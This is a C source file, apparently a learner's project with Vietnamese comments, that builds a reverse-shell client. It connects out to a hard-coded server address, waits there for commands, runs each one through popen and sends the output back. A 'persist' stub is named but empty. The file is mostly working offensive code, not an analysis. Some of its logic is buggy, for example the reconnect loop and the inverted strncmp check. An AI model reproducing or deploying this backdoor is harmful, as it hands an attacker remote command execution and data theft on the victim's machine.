//____________________________________________________//
// https://www.geeksforgeeks.org/socket-programming-cc/
//---------------------------------------------------//
//

#include <arpa/inet.h>
/*#include <cstdlib>*/
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/socket.h>
#include <unistd.h>
int sock;

// str_cut method

void bootRun() {
  char arr[128] = "Failed\n";
  char success[128] = "successful\n";
}
char *str_cut(char str[], int slice_from, int slice_to) {
  // neu nhu cai str[] no chi co 1 cai gia tri cuoi '\0' thi return lai la NULL
  if (str[0] == '\0') {
    return NULL;
  }

  char *buffer;
  size_t str_len;
  size_t buffer_len;

  if (slice_to < 0 && slice_from > slice_to) {
    str_len = strlen(str);
    // trong truong hop slice_to no vuot qua do dai cua str_len thi can tra ve
    // NULL
    if (abs(slice_to) > str_len - 1) {
      return NULL;
    }
    // neu slice_from lon hon str_len thi can cho no ve gia tri dau tien cua
    // str_len
    if (abs(slice_from) > str_len) {
      slice_from = (-1) * str_len;
    }

    buffer_len = slice_to - slice_from;
    str = str + (str_len + slice_from);
  }

  else if (slice_to > 0 && slice_from < slice_to) {
    str_len = strlen(str);

    if (slice_from > str_len - 1) {
      return NULL;
    }
    buffer_len = slice_to - slice_from;
    str = str + slice_from;
  }

  else {
    return NULL;
  }

  buffer = calloc(buffer_len, sizeof(char));
  strncpy(buffer, str, buffer_len);
  return buffer;
}

// viet shell method
void Shell() {
  char buffer[1024];
  char container[1024];
  char total_response[18324];
  while (1) {
    memset(buffer, 0, sizeof(buffer));
    memset(container, 0, sizeof(container));
    memset(total_response, 0, sizeof(total_response));
    recv(sock, buffer, sizeof(buffer), 0);
    // vi cai buffer luu commandline tu server se dai nen dung strncmp lay chu
    // cai dau tien thoi
    if (strncmp("q", buffer, 1) == 0) {
      //"q" is quit
      close(sock);
      exit(0);
    }
    // het quit commandline
    else if (strncmp("cd ", buffer, 3) == 0) {
      chdir(str_cut(buffer, 3, 100));
    } else if (strncmp("persist", buffer, 7)) {
      bootRun();
    } else {
      FILE *fp;
      fp = popen(buffer, "r");
      while (fgets(container, 1024, fp) != NULL) {
        strcat(total_response, container);
      }
      // cai nay no send toan bo cai respose nay ve server
      send(sock, total_response, sizeof(total_response), 0);
      // dong lai cai FILE
      pclose(fp);
    }
  }
}

// main
int main() {
  struct sockaddr_in serverAddr;
  int serverPort;
  char *serverIp;

  serverIp = "192.168.0.103"; // i don't know about my ip
  serverPort = 50005;

  // tao 1 socket
  sock = socket(AF_INET, SOCK_STREAM, 0);
  if (sock < 0) {
    perror("socket creation failed");
    exit(1);
  }
  // thiet lap dia chi server
  //
  // cho het cai bo nho cua server addres ve 0
  memset(&serverAddr, 0, sizeof(serverAddr));
  serverAddr.sin_family = AF_INET;
  serverAddr.sin_addr.s_addr = inet_addr(serverIp);
  serverAddr.sin_port = htons(serverPort);

  // ket noi den server
  int connected =
      connect(sock, (struct sockaddr *)&serverAddr, sizeof(serverAddr));
  // cai function connect() no se connect lai voi server
  // neu khong connect duoc no se sleep in 10 second and one more time connect
  // to server
  while (connected != 0) {
    sleep(10);
  }

  printf("Connected to server@@\n");

  // bat dau shell
  Shell();
  return 0;
}
// end main
